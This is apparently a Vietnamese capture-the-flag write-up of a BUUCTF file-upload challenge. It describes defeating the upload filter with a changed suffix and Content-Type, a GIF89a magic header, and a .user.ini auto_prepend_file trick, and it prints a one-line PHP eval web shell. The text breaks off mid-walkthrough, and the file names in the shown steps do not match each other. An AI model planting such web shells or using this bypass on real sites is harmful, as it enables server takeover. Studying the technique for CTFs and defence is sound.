![Screenshot 2024-01-05 084737](https://github.com/Llam-a/BUUCTF/assets/115911041/24f09ecb-910d-41cd-8e80-dcee91a30f9d)

Mình sẽ upload Trojan r dùng burpsuite để bắt package 

![Screenshot 2024-01-05 084917](https://github.com/Llam-a/BUUCTF/assets/115911041/cfaced9f-a759-4078-90bf-e17241947d51)

Và kết quả là bị filter nên mình sẽ đổi suffix của file và sửa lại content_type đi

![Screenshot 2024-01-05 085039](https://github.com/Llam-a/BUUCTF/assets/115911041/988f6a4a-8ef0-472a-bf12-95739b1a5ab2)

Vẫn bị filter, mình thay đổi Trojan 1 chút

![Screenshot 2024-01-05 085149](https://github.com/Llam-a/BUUCTF/assets/115911041/fb9d39ba-e8d1-4aac-b05f-c47862b28a00)

Sau đó thì nó hiện ra lỗi exif_imagetype.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/5f5799b0-d7a7-40e3-ac47-32910f4e07f0)

Hàm exif_imagetype() dùng để đọc thông tin Exif đầu tiên trong một tệp hình ảnh và xác định kiểu của nó.Hàm sẽ mở tệp và đọc một phần nhỏ của dữ liệu Exif từ đầu tệp. Sau đó, nó sẽ phân tích và so sánh các giá trị trong dữ liệu Exif với các mẫu kiểu hình ảnh đã biết để xác định kiểu của tệp.Nếu hàm exif_imagetype() không thể đọc dữ liệu Exif từ tệp hoặc không tìm thấy các mẫu kiểu hình ảnh phù hợp, nó sẽ trả về giá trị FALSE. Nếu thành công, nó trả về một số nguyên đại diện cho kiểu hình ảnh, như đã mô tả trong giải thích trước đó.

Vậy ta thêm GIF89a vào đầu

![Screenshot 2024-01-05 092444](https://github.com/Llam-a/BUUCTF/assets/115911041/bd467482-0b30-41a5-a68a-f04f164a45e8)

Và ta đã upload thành công.Nhưng mà bây giờ nó chỉ ở dạng hình ảnh,và ta phải parse nó sang php.Sau khi research thì mính biết them 1 cách để bypass filter trong upload file là upload `.user.ini`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/86bde3dc-a45c-4ab8-94c0-17ca6803a703)

Tệp .user.ini cho phép bạn tùy chỉnh cấu hình PHP một cách linh hoạt và không yêu cầu quyền quản trị hệ thống.Khi một yêu cầu web được gửi đến ứng dụng PHP, trình chủ (web server) sẽ tìm kiếm tệp .user.ini trong thư mục gốc của ứng dụng. Nếu tệp tồn tại, các thiết lập trong tệp sẽ được áp dụng cho yêu cầu hiện tại và các yêu cầu sau đó trong cùng phiên làm việc.Ta có thể đặt cài đặt INI của chế độ PHP_INI_PERDIR và PHP_INI_USER trong php.ini trong .user.ini và .user.ini có thể được sử dụng miễn là nó nằm trên máy chủ sử dụng chế độ CGI/FastCGI.

Và có 2 setting thú vị là: auto_prepend_file và auto_append_file

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/b639e580-91ef-4cc9-a258-49beaeebd983)

Tên file được chỉ định sẽ được tự động parse vào file chính. Ví dụ ta set auto_prepend_file=test.abc ở file .user.ini thì khi ta mở 1 file php trong cùng thư mục thì cái file test.abc đó sẽ tự động được load vào file php đó, tương tự như khi ta gọi đến 1 hàm include hoặc require.

Từ đó dẫn đến ý tưởng attack là đầu tiên ta sẽ upload 1 file thỏa mãn filter và chứa code php trong đó. Ví dụ exploit.png

```PNG
<script language="php">@eval($_POST['shell']);</script>
```
Sau đó upload 1 file .user.ini có chứa setting auto_prepend_file vào file exploit.png với nội dung sau:

```PNG
auto_prepend_file=test.png
```

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/17786d2f-8eca-4e3d-84ea-ea3d750049c3)

Tiếp theo mình upload file Trojan




